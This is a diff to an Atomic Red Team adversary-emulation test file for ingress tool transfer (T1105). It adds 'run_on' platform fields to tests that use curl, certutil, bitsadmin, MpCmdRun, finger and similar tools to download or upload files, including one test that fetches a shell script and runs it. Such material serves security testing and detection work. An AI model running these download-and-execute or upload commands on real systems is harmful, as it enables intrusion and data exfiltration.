@@ -38,6 +38,10 @@ atomic_tests:
       rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
     name: sh
     elevation_required: true
+  run_on:
+  - freebsd
+  - linux
+  - macos
 - name: rsync remote file copy (pull)
   auto_generated_guid: 3180f7d5-52c0-4493-9ea0-e3431a84773f
   description: |
@@ -74,6 +78,10 @@ atomic_tests:
     command: |
       rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
     name: sh
+  run_on:
+  - freebsd
+  - linux
+  - macos
 - name: scp remote file copy (push)
   auto_generated_guid: 83a49600-222b-4866-80a0-37736ad29344
   description: |
@@ -102,6 +110,10 @@ atomic_tests:
     command: |
       scp #{local_file} #{username}@#{remote_host}:#{remote_path}
     name: sh
+  run_on:
+  - freebsd
+  - linux
+  - macos
 - name: scp remote file copy (pull)
   auto_generated_guid: b9d22b9a-9778-4426-abf0-568ea64e9c33
   description: |
@@ -130,6 +142,10 @@ atomic_tests:
     command: |
       scp #{username}@#{remote_host}:#{remote_file} #{local_path}
     name: sh
+  run_on:
+  - freebsd
+  - linux
+  - macos
 - name: sftp remote file copy (push)
   auto_generated_guid: f564c297-7978-4aa9-b37a-d90477feea4e
   description: |
@@ -158,6 +174,10 @@ atomic_tests:
     command: |
       sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
     name: sh
+  run_on:
+  - freebsd
+  - linux
+  - macos
 - name: sftp remote file copy (pull)
   auto_generated_guid: 0139dba1-f391-405e-a4f5-f3989f2c88ef
   description: |
@@ -186,6 +206,10 @@ atomic_tests:
     command: |
       sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
     name: sh
+  run_on:
+  - freebsd
+  - linux
+  - macos
 - name: certutil download (urlcache)
   auto_generated_guid: dd3b61dd-7bbc-48cd-ab51-49ad1a776df0
   description: |
@@ -207,6 +231,8 @@ atomic_tests:
     cleanup_command: |
       del #{local_path} >nul 2>&1
     name: command_prompt
+  run_on:
+  - windows
 - name: certutil download (verifyctl)
   auto_generated_guid: ffd492e3-0455-4518-9fb1-46527c9f241b
   description: |
@@ -232,6 +258,8 @@ atomic_tests:
     cleanup_command: |
       Remove-Item "certutil-$(Get-Date -format yyyy_MM_dd)" -Force -Recurse -ErrorAction Ignore
     name: powershell
+  run_on:
+  - windows
 - name: Windows - BITSAdmin BITS Download
   auto_generated_guid: a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b
   description: |
@@ -256,6 +284,8 @@ atomic_tests:
     command: |
       C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
     name: command_prompt
+  run_on:
+  - windows
 - name: Windows - PowerShell Download
   auto_generated_guid: 42dc4460-9aa6-45d3-b1a6-3955d34e1fe8
   description: |
@@ -278,6 +308,8 @@ atomic_tests:
     cleanup_command: |
       Remove-Item #{destination_path} -Force -ErrorAction Ignore
     name: powershell
+  run_on:
+  - windows
 - name: OSTAP Worming Activity
   auto_generated_guid: 2ca61766-b456-4fcf-a35a-1233685e1cad
   description: |
@@ -288,7 +320,7 @@ atomic_tests:
     destination_path:
       description: Path to create remote file at. Default is local admin share.
       type: string
-      default: '\\localhost\C$'
+      default: \\localhost\C$
   executor:
     command: |
       pushd #{destination_path}
@@ -299,6 +331,8 @@ atomic_tests:
       popd
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: svchost writing a file to a UNC path
   auto_generated_guid: fa5a2759-41d7-4e13-a19c-e8f28a53566f
   description: |
@@ -315,6 +349,8 @@ atomic_tests:
       del C:\\svchost.exe >nul 2>&1
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Download a File with Windows Defender MpCmdRun.exe
   auto_generated_guid: 815bef8b-bf91-4b67-be4c-abe4c2a94ccc
   description: |
@@ -335,11 +371,12 @@ atomic_tests:
       type: path
       default: '%temp%\Atomic-license.txt'
   dependencies:
-  - description: 'Must have a Windows Defender version with MpCmdRun.exe installed'
+  - description: Must have a Windows Defender version with MpCmdRun.exe installed
     prereq_command: |
       cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
       MpCmdRun.exe /?  >nul 2>&1
-    get_prereq_command: Echo "A version of Windows Defender with MpCmdRun.exe must be installed manually"
+    get_prereq_command: Echo "A version of Windows Defender with MpCmdRun.exe must
+      be installed manually"
   executor:
     command: |
       cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
@@ -348,6 +385,8 @@ atomic_tests:
       del #{local_path} >nul 2>&1
       del %temp%\MpCmdRun.log >nul 2>&1
     name: command_prompt
+  run_on:
+  - windows
 - name: whois file download
   auto_generated_guid: c99a829f-0bb8-4187-b2c6-d47d1df74cab
   description: |
@@ -371,7 +410,7 @@ atomic_tests:
     query:
       description: Query to send to remote server
       type: string
-      default: "Hello from Atomic Red Team test T1105"
+      default: Hello from Atomic Red Team test T1105
     timeout:
       description: Timeout period before ending process (seconds)
       type: integer
@@ -390,6 +429,10 @@ atomic_tests:
       timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} "#{query}" > #{output_file}
     cleanup_command: |
       rm -f #{output_file}
+  run_on:
+  - freebsd
+  - linux
+  - macos
 - name: File Download via PowerShell
   auto_generated_guid: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2
   description: |
@@ -400,7 +443,8 @@ atomic_tests:
     target_remote_file:
       description: File to download
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
     output_file:
       description: File to write to
       type: string
@@ -409,6 +453,8 @@ atomic_tests:
     command: |
       (New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}
     name: powershell
+  run_on:
+  - windows
 - name: File download with finger.exe on Windows
   auto_generated_guid: 5f507e45-8411-4f99-84e7-e38530c45d01
   description: |
@@ -427,6 +473,8 @@ atomic_tests:
     name: command_prompt
     command: |
       finger base64_filedata@#{remote_host}
+  run_on:
+  - windows
 - name: Download a file with IMEWDBLD.exe
   auto_generated_guid: 1a02df58-09af-4064-a765-0babe1a0d1e2
   description: |
@@ -439,7 +487,8 @@ atomic_tests:
     remote_url:
       description: Location of file to be downloaded.
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
     file_name:
       description: Name of the file to be downloaded without extension.
       type: string
@@ -453,7 +502,8 @@ atomic_tests:
       $file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)
       if("" -ne "$file_to_be_removed") { Remove-Item "$file_to_be_removed" -ErrorAction Ignore }
     name: powershell
-
+  run_on:
+  - windows
 - name: Curl Download File
   auto_generated_guid: 2b080b99-0deb-4d51-af0f-833d37c4ca6a
   description: |
@@ -465,7 +515,8 @@ atomic_tests:
     file_download:
       description: File to download
       type: string
-      default: https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
+      default: 
+        https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
     curl_path:
       description: path to curl.exe
       type: path
@@ -494,7 +545,8 @@ atomic_tests:
       del c:\programdata\allthethingsx64.dll >nul 2>&1
       del %Temp%\allthethingsx64.dll >nul 2>&1
     name: command_prompt
-
+  run_on:
+  - windows
 - name: Curl Upload File
   auto_generated_guid: 635c9a38-6cbf-47dc-8615-3810bc1167cf
   description: |
@@ -540,7 +592,8 @@ atomic_tests:
       #{curl_path} -d #{file_path} #{remote_destination}
       #{curl_path} --data #{file_path} #{remote_destination}
     name: command_prompt
-
+  run_on:
+  - windows
 - name: Download a file with Microsoft Connection Manager Auto-Download
   auto_generated_guid: d239772b-88e2-4a2e-8473-897503401bcc
   description: |
@@ -575,7 +628,8 @@ atomic_tests:
       del /f/s/q %temp%\T1105 >nul 2>&1
       rmdir /s/q %temp%\T1105 >nul 2>&1
     name: command_prompt
-
+  run_on:
+  - windows
 - name: MAZE Propagation Script
   auto_generated_guid: 70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf
   description: |
@@ -633,7 +687,8 @@ atomic_tests:
       Remove-Item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt" -erroraction silentlycontinue
       Remove-item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt" -erroraction silentlycontinue
     name: powershell
-
+  run_on:
+  - windows
 - name: Printer Migration Command-Line Tool UNC share folder into a zip file
   auto_generated_guid: 49845fc1-7961-4590-a0f0-3dbcf065ae7e
   description: |
@@ -656,7 +711,8 @@ atomic_tests:
     cleanup_command: |
       del %TEMP%\PrintBrm.zip >nul 2>&1
     name: command_prompt
-
+  run_on:
+  - windows
 - name: Lolbas replace.exe use to copy file
   auto_generated_guid: 54782d65-12f0-47a5-b4c1-b70ee23de6df
   description: |
@@ -689,7 +745,8 @@ atomic_tests:
     cleanup_command: |
       del %TEMP%\redcanary.cab >nul 2>&1
     name: command_prompt
-
+  run_on:
+  - windows
 - name: Lolbas replace.exe use to copy UNC file
   auto_generated_guid: ed0335ac-0354-400c-8148-f6151d20035a
   description: |
@@ -713,7 +770,8 @@ atomic_tests:
     cleanup_command: |
       del %TEMP%\redcanary.cab >nul 2>&1
     name: command_prompt
-
+  run_on:
+  - windows
 - name: certreq download
   auto_generated_guid: 6fdaae87-c05b-42f8-842e-991a74e8376b
   description: Use certreq to download a file from the web
@@ -732,7 +790,8 @@ atomic_tests:
     command: 'certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}'
     cleanup_command: 'del #{local_path} >nul 2>&1'
     name: command_prompt
-
+  run_on:
+  - windows
 - name: Download a file using wscript
   auto_generated_guid: 97116a3f-efac-4b26-8336-b9cb18c45188
   description: Use wscript to run a local VisualBasic file to download a remote file
@@ -757,27 +816,35 @@ atomic_tests:
       wscript.exe "#{vbscript_file}"
     cleanup_command: del Atomic-License.txt >nul 2>&1
     name: command_prompt
-- name: Linux Download File and Run
+  run_on:
+  - windows
+- name: FreeBSD/Linux Download File and Run
   auto_generated_guid: bdc373c5-e9cf-4563-8a7b-a9ba720a90f3
   description: |
-    Utilize linux Curl to download a remote file, chmod +x it and run it.
+    Utilize FreeBSD/Linux Curl to download a remote file, chmod +x it and run it.
   supported_platforms:
   - linux
   input_arguments:
     remote_url:
       description: url of remote payload
       type: string
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh
     payload_name:
       description: payload name
       type: string
       default: atomic.sh
+    get_prereq_command: |
+      which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
   executor:
     command: |
       curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
     cleanup_command: |
       rm #{payload_name}
     name: sh
+  run_on:
+  - freebsd
+  - linux
 - name: Nimgrab - Transfer Files
   auto_generated_guid: b1729c57-9384-4d1c-9b99-9b220afb384e
   description: |
@@ -810,6 +877,8 @@ atomic_tests:
       Invoke-WebRequest "https://nim-lang.org/download/nim-1.6.6_x64.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\nim.zip"
       Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\nim.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\nim" -Force
       Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\nim\nim-1.6.6\bin\nimgrab.exe" "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"
+  run_on:
+  - windows
 - name: iwr or Invoke Web-Request download
   auto_generated_guid: c01cad7f-7a4c-49df-985e-b190dcf6a279
   description: |
@@ -832,3 +901,5 @@ atomic_tests:
       del %temp%\Atomic-license.txt >nul 2>&1
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
